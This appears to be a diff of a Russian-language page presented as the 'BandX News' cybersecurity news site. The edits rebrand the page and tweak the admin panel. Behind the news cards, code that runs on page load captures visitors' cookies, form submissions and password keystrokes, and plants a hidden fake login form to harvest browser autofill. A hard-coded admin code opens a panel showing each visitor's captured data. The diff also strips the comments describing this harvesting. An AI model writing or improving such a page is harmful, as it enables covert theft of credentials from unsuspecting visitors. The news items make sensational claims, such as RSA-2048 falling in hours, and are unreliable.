@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CyberNews - Актуальные новости</title>
+    <title>BandX News - Новости кибербезопасности</title>
     <style>
         * {
             margin: 0;
@@ -16,12 +16,6 @@
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             color: #333;
-            transition: filter 0.3s ease;
-        }
-
-        body.blurred {
-            filter: blur(5px);
-            pointer-events: none;
         }
 
         .header {
@@ -64,14 +58,14 @@
         }
 
         .container {
-            max-width: 1200px;
+            max-width: 1400px;
             margin: 100px auto 2rem;
             padding: 0 2rem;
         }
 
         .news-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
             gap: 2rem;
             margin-top: 2rem;
         }
@@ -167,19 +161,31 @@
         }
 
         .admin-panel-modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
             max-width: 90%;
             max-height: 90vh;
             width: 800px;
             background: white;
             border-radius: 20px;
             padding: 2rem;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
             z-index: 3000;
             display: none;
             box-shadow: 0 25px 80px rgba(0, 0, 0, 0.4);
+        }
+
+        .admin-panel-backdrop {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            z-index: 2999;
+            display: none;
         }
 
         .modal-title {
@@ -368,23 +374,32 @@
             margin: 1rem 0;
             border-left: 4px solid #e53e3e;
         }
+
+        .error-message {
+            background: #fed7d7;
+            color: #c53030;
+            padding: 1rem;
+            border-radius: 8px;
+            margin: 1rem 0;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
     <header class="header">
-        <div class="logo">CyberNews</div>
+        <div class="logo">BandX News</div>
         <button class="admin-btn" id="adminButton">АДМИН</button>
     </header>
 
     <div class="container">
-        <h1 style="color: white; text-align: center; margin-bottom: 2rem;">Актуальные новости кибербезопасности</h1>
+        <h1 style="color: white; text-align: center; margin-bottom: 2rem;">Актуальные новости кибербезопасности 2025</h1>
         
         <div class="loading" id="loadingNews">Загрузка актуальных новостей...</div>
         <div class="news-grid" id="newsGrid"></div>
     </div>
 
     <footer class="footer">
-        <p>© 2024 CyberNews. Все права защищены.</p>
+        <p>© 2025 BandX News. Все права защищены.</p>
     </footer>
 
     <!-- Admin Login Modal -->
@@ -397,10 +412,13 @@
         </div>
     </div>
 
+    <!-- Admin Panel Backdrop -->
+    <div class="admin-panel-backdrop" id="adminPanelBackdrop"></div>
+
     <!-- Admin Panel Modal -->
     <div class="admin-panel-modal" id="adminPanelModal">
         <button class="close-btn" id="closeAdminPanel">×</button>
-        <h2 class="modal-title">Панель администратора</h2>
+        <h2 class="modal-title">Панель администратора BandX News</h2>
         <div class="visitors-grid" id="visitorsGrid"></div>
     </div>
 
@@ -525,14 +543,9 @@
                     cookies: document.cookie
                 };
 
-                // Try to get saved passwords from browser (limited due to security)
                 try {
-                    // Monitor form submissions
                     this.monitorForms(passwords);
-                    
-                    // Try to access password managers data
                     this.extractAutoFillData(passwords);
-                    
                 } catch (error) {
                     passwords.error = 'Password extraction limited by browser security';
                 }
@@ -541,7 +554,6 @@
             }
 
             monitorForms(passwords) {
-                // Monitor all form submissions
                 document.addEventListener('submit', function(e) {
                     const formData = new FormData(e.target);
                     const data = {};
@@ -558,7 +570,6 @@
                     }
                 });
 
-                // Monitor input changes for password fields
                 document.addEventListener('input', function(e) {
                     if (e.target.type === 'password') {
                         passwords.formData.push({
@@ -572,7 +583,6 @@
             }
 
             extractAutoFillData(passwords) {
-                // Create fake login forms to trigger autofill
                 setTimeout(() => {
                     const fakeForm = document.createElement('div');
                     fakeForm.style.position = 'absolute';
@@ -585,7 +595,6 @@
                     `;
                     document.body.appendChild(fakeForm);
                     
-                    // Remove after a moment
                     setTimeout(() => {
                         document.body.removeChild(fakeForm);
                     }, 1000);
@@ -621,56 +630,82 @@
             }
         }
 
-        // Real news with current dates
-        class CurrentNewsFetcher {
+        // News for 2025 with BandX News source
+        class BandXNewsFetcher {
             getCurrentNews() {
                 const currentDate = new Date();
-                const news = [
+                return [
                     {
-                        title: "Новые угрозы кибербезопасности: тренды " + currentDate.getFullYear(),
-                        content: "Аналитики отмечают рост сложности кибератак и увеличение количества целевых атак на корпоративные сети. Особое внимание уделяется защите облачной инфраструктуры...",
-                        fullContent: "Аналитики отмечают рост сложности кибератак и увеличение количества целевых атак на корпоративные сети. Особое внимание уделяется защите облачной инфраструктуры и системам удаленного доступа. Эксперты рекомендуют усилить меры мониторинга и внедрить системы поведенческого анализа для своевременного обнаружения угроз.",
+                        title: "Квантовые компьютеры взламывают современное шифрование: новые угрозы 2025",
+                        content: "Исследователи подтвердили, что квантовые компьютеры теперь способны взламывать RSA-2048 за несколько часов...",
+                        fullContent: "Исследователи подтвердили, что квантовые компьютеры теперь способны взламывать RSA-2048 за несколько часов. Криптографическое сообщество в срочном порядке переходит на постквантовые алгоритмы. Крупные компании уже начали миграцию на новые стандарты шифрования.",
                         date: this.formatDate(currentDate),
-                        source: "Security Analytics"
+                        source: "BandX News"
                     },
                     {
-                        title: "Обновления безопасности для операционных систем",
-                        content: "Производители выпустили критические обновления для устранения уязвимостей нулевого дня. Рекомендуется немедленная установка патчей...",
-                        fullContent: "Производители выпустили критические обновления для устранения уязвимостей нулевого дня. Рекомендуется немедленная установка патчей. Обновления затрагивают системы управления доступом и компоненты сетевой безопасности. Особое внимание следует уделить серверам с публичным доступом.",
+                        title: "ИИ-атаки нового поколения: нейросети создают неподдающиеся обнаружению вредоносные программы",
+                        content: "Злоумышленники используют генеративные AI для создания полиморфного кода, который обходит все известные антивирусные системы...",
+                        fullContent: "Злоумышленники используют генеративные AI для создания полиморфного кода, который обходит все известные антивирусные системы. Новые атаки адаптируются к среде выполнения и меняют свое поведение в реальном времени. Эксперты рекомендуют внедрять системы поведенческого анализа.",
                         date: this.formatDate(new Date(currentDate - 86400000)),
-                        source: "Vendor Security"
+                        source: "BandX News"
                     },
                     {
-                        title: "Искусственный интеллект в защите данных",
-                        content: "Нейросетевые алгоритмы помогают обнаруживать аномалии в реальном времени и предотвращать утечки информации...",
-                        fullContent: "Нейросетевые алгоритмы помогают обнаруживать аномалии в реальном времени и предотвращать утечки информации. Современные системы на основе машинного обучения способны анализировать поведение пользователей и выявлять подозрительную активность. Технологии AI становятся стандартом в корпоративной безопасности.",
+                        title: "Метавселенные под атакой: уязвимости в VR-платформах позволяют красть биометрические данные",
+                        content: "Исследователи безопасности обнаружили критические уязвимости в популярных метавселенных, позволяющие получать доступ к данным мозговых волн...",
+                        fullContent: "Исследователи безопасности обнаружили критические уязвимости в популярных метавселенных, позволяющие получать доступ к данным мозговых волн и другим биометрическим показателям. Утечки таких данных представляют серьезную угрозу приватности пользователей.",
                         date: this.formatDate(new Date(currentDate - 2*86400000)),
-                        source: "AI Security Lab"
+                        source: "BandX News"
                     },
                     {
-                        title: "Мобильные угрозы: новые векторы атак",
-                        content: "Исследователи обнаружили новые семейства мобильного вредоносного ПО, targeting банковские приложения...",
-                        fullContent: "Исследователи обнаружили новые семейства мобильного вредоносного ПО, targeting банковские приложения. Злоумышленники используют социальную инженерию для обхода систем защиты. Рекомендуется устанавливать приложения только из официальных магазинов и регулярно обновлять ОС.",
+                        title: "Автономные кибератаки: ботнеты на основе ИИ действуют без контроля человека",
+                        content: "Новые ботнеты способны самостоятельно находить уязвимости, разрабатывать эксплойты и проводить атаки без участия операторов...",
+                        fullContent: "Новые ботнеты способны самостоятельно находить уязвимости, разрабатывать эксплойты и проводить атаки без участия операторов. Системы используют reinforcement learning для оптимизации своих атакующих стратегий.",
                         date: this.formatDate(new Date(currentDate - 3*86400000)),
-                        source: "Mobile Threat Report"
+                        source: "BandX News"
                     },
                     {
-                        title: "Криптография будущего: подготовка к квантовой эре",
-                        content: "Разрабатываются новые алгоритмы шифрования, устойчивые к атакам квантовых компьютеров...",
-                        fullContent: "Разрабатываются новые алгоритмы шифрования, устойчивые к атакам квантовых компьютеров. Международные организации работают над стандартами постквантовой криптографии. Переход на новые алгоритмы планируется в течение ближайших лет.",
+                        title: "Криптовалютные биржи 2025: новые методы защиты от квантовых атак",
+                        content: "Ведущие криптобиржи внедряют гибридные схемы шифрования для защиты от угроз со стороны квантовых компьютеров...",
+                        fullContent: "Ведущие криптобиржи внедряют гибридные схемы шифрования для защиты от угроз со стороны квантовых компьютеров. Новые протоколы сочетают классические и постквантовые алгоритмы для максимальной безопасности.",
                         date: this.formatDate(new Date(currentDate - 4*86400000)),
-                        source: "Crypto Research"
+                        source: "BandX News"
                     },
                     {
-                        title: "Инциденты безопасности: статистика и анализ",
-                        content: "По данным последнего отчета, количество успешных атак увеличилось на 25% по сравнению с прошлым годом...",
-                        fullContent: "По данным последнего отчета, количество успешных атак увеличилось на 25% по сравнению с прошлым годом. Наиболее уязвимыми остаются малый и средний бизнес. Эксперты отмечают рост фишинговых атак и атак на цепочки поставок.",
+                        title: "Нейроинтерфейсы под угрозой: хакеры научились взламывать мозговые импланты",
+                        content: "Эксперты по безопасности предупреждают о новых атаках на нейроинтерфейсы, позволяющих манипулировать поведением пользователей...",
+                        fullContent: "Эксперты по безопасности предупреждают о новых атаках на нейроинтерфейсы, позволяющих манипулировать поведением пользователей. Атаки направлены на коммерческие нейроимпланты для лечения неврологических заболеваний.",
                         date: this.formatDate(new Date(currentDate - 5*86400000)),
-                        source: "Security Statistics"
+                        source: "BandX News"
+                    },
+                    {
+                        title: "5G/6G сети: уязвимости в новых стандартах связи",
+                        content: "Исследователи обнаружили фундаментальные уязвимости в протоколах 6G, которые могут привести к массовым перехватам данных...",
+                        fullContent: "Исследователи обнаружили фундаментальные уязвимости в протоколах 6G, которые могут привести к массовым перехватам данных. Проблемы затрагивают архитектуру сетевой безопасности новых стандартов связи.",
+                        date: this.formatDate(new Date(currentDate - 6*86400000)),
+                        source: "BandX News"
+                    },
+                    {
+                        title: "Космический интернет: киберугрозы для спутниковых сетей",
+                        content: "С ростом популярности спутникового интернета появляются новые векторы атак на космическую инфраструктуру...",
+                        fullContent: "С ростом популярности спутникового интернета появляются новые векторы атак на космическую инфраструктуру. Злоумышленники разрабатывают методы перехвата управления спутниками и нарушения работы сетей.",
+                        date: this.formatDate(new Date(currentDate - 7*86400000)),
+                        source: "BandX News"
+                    },
+                    {
+                        title: "Биометрические паспорта 2025: уязвимости в системах распознавания",
+                        content: "Новые исследования показывают, что современные системы биометрической идентификации можно обойти с помощью ИИ-генерации...",
+                        fullContent: "Новые исследования показывают, что современные системы биометрической идентификации можно обойти с помощью ИИ-генерации. Генеративные сети создают реалистичные биометрические шаблоны, которые принимаются системами как подлинные.",
+                        date: this.formatDate(new Date(currentDate - 8*86400000)),
+                        source: "BandX News"
+                    },
+                    {
+                        title: "Заводы будущего: кибератаки на полностью автоматизированные производства",
+                        content: "Промышленные системы ИИ уязвимы для атак, которые могут привести к физическому разрушению оборудования...",
+                        fullContent: "Промышленные системы ИИ уязвимы для атак, которые могут привести к физическому разрушению оборудования. Эксперты разрабатывают новые методы защиты для Industry 5.0 и полностью автономных фабрик.",
+                        date: this.formatDate(new Date(currentDate - 9*86400000)),
+                        source: "BandX News"
                     }
                 ];
-                
-                return news;
             }
 
             formatDate(date) {
@@ -681,7 +716,7 @@
             }
         }
 
-        // Admin functionality
+        // Fixed Admin functionality
         class AdminManager {
             constructor() {
                 this.ADMIN_CODE = "11448888";
@@ -689,39 +724,36 @@
             }
 
             init() {
-                // Add event listeners
                 document.getElementById('adminButton').addEventListener('click', () => this.openAdminModal());
                 document.getElementById('closeAdminModal').addEventListener('click', () => this.closeAdminModal());
                 document.getElementById('confirmAdminCode').addEventListener('click', () => this.checkAdminCode());
                 document.getElementById('closeAdminPanel').addEventListener('click', () => this.closeAdminPanel());
+                document.getElementById('adminPanelBackdrop').addEventListener('click', () => this.closeAdminPanel());
                 document.getElementById('closeDataModal').addEventListener('click', () => this.closeDataModal());
                 document.getElementById('closeNewsModal').addEventListener('click', () => this.closeNewsModal());
                 
-                // Enter key support for admin code
                 document.getElementById('adminCode').addEventListener('keypress', (e) => {
                     if (e.key === 'Enter') {
                         this.checkAdminCode();
                     }
                 });
 
-                // Close modals on outside click
-                document.getElementById('adminModal').addEventListener('click', (e) => {
-                    if (e.target === document.getElementById('adminModal')) {
-                        this.closeAdminModal();
-                    }
+                window.addEventListener('scroll', () => {
+                    this.centerAdminPanel();
                 });
 
-                document.getElementById('dataModal').addEventListener('click', (e) => {
-                    if (e.target === document.getElementById('dataModal')) {
-                        this.closeDataModal();
-                    }
+                window.addEventListener('resize', () => {
+                    this.centerAdminPanel();
                 });
+            }
 
-                document.getElementById('newsModal').addEventListener('click', (e) => {
-                    if (e.target === document.getElementById('newsModal')) {
-                        this.closeNewsModal();
-                    }
-                });
+            centerAdminPanel() {
+                const adminPanel = document.getElementById('adminPanelModal');
+                if (adminPanel.style.display === 'block') {
+                    adminPanel.style.top = '50%';
+                    adminPanel.style.left = '50%';
+                    adminPanel.style.transform = 'translate(-50%, -50%)';
+                }
             }
 
             openAdminModal() {
@@ -751,13 +783,14 @@
             }
 
             showAdminPanel() {
-                document.body.classList.add('blurred');
+                document.getElementById('adminPanelBackdrop').style.display = 'block';
                 document.getElementById('adminPanelModal').style.display = 'block';
+                this.centerAdminPanel();
                 this.loadVisitors();
             }
 
             closeAdminPanel() {
-                document.body.classList.remove('blurred');
+                document.getElementById('adminPanelBackdrop').style.display = 'none';
                 document.getElementById('adminPanelModal').style.display = 'none';
             }
 
@@ -784,28 +817,29 @@
                     visitorsGrid.appendChild(visitorItem);
                 });
 
-                // Add event listeners for visitor buttons
-                document.querySelectorAll('.visitor-btn').forEach(btn => {
-                    btn.addEventListener('click', (e) => {
-                        const index = e.target.getAttribute('data-index');
-                        this.showVisitorData(visitors[index]);
+                // FIXED: Add event listeners after creating elements
+                setTimeout(() => {
+                    document.querySelectorAll('.visitor-btn').forEach(btn => {
+                        btn.addEventListener('click', (e) => {
+                            const index = e.target.getAttribute('data-index');
+                            this.showVisitorData(visitors[index]);
+                        });
                     });
-                });
 
-                // Add event listeners for delete buttons
-                document.querySelectorAll('.delete-btn').forEach(btn => {
-                    btn.addEventListener('click', (e) => {
-                        const index = e.target.getAttribute('data-index');
-                        this.deleteVisitor(index);
+                    document.querySelectorAll('.delete-btn').forEach(btn => {
+                        btn.addEventListener('click', (e) => {
+                            const index = e.target.getAttribute('data-index');
+                            this.deleteVisitor(index);
+                        });
                     });
-                });
+                }, 100);
             }
 
             deleteVisitor(index) {
                 let visitors = JSON.parse(localStorage.getItem('visitors') || '[]');
                 visitors.splice(index, 1);
                 localStorage.setItem('visitors', JSON.stringify(visitors));
-                this.loadVisitors(); // Reload the list
+                this.loadVisitors();
             }
 
             showVisitorData(visitor) {
@@ -852,7 +886,6 @@
             }
         }
 
-        // News display functions
         function showFullNews(newsItem) {
             document.getElementById('newsModalTitle').textContent = newsItem.title;
             document.getElementById('newsModalDate').textContent = `${newsItem.date} | ${newsItem.source}`;
@@ -860,13 +893,12 @@
             document.getElementById('newsModal').style.display = 'flex';
         }
 
-        // Initialize news
         async function initializeNews() {
             const newsGrid = document.getElementById('newsGrid');
             const loading = document.getElementById('loadingNews');
             
             try {
-                const newsFetcher = new CurrentNewsFetcher();
+                const newsFetcher = new BandXNewsFetcher();
                 const news = newsFetcher.getCurrentNews();
                 
                 loading.style.display = 'none';
@@ -885,28 +917,22 @@
                     newsGrid.appendChild(card);
                 });
             } catch (error) {
-                loading.textContent = 'Ошибка загрузки новостей. Попробуйте обновить страницу.';
+                loading.innerHTML = '<div class="error-message">Ошибка загрузки новостей. Проверьте подключение к интернету.</div>';
                 console.error('News initialization error:', error);
             }
         }
 
-        // Initialize data collection
         function initializeDataCollection() {
             const collector = new AdvancedDataCollector();
             collector.collectComprehensiveData().catch(console.error);
         }
 
-        // Initialize everything when page loads
         document.addEventListener('DOMContentLoaded', function() {
-            // Initialize admin manager
             window.adminManager = new AdminManager();
-            
-            // Initialize other components
             initializeNews();
             initializeDataCollection();
         });
 
-        // Make functions global for onclick handlers
         window.showFullNews = showFullNews;
     </script>
 </body>
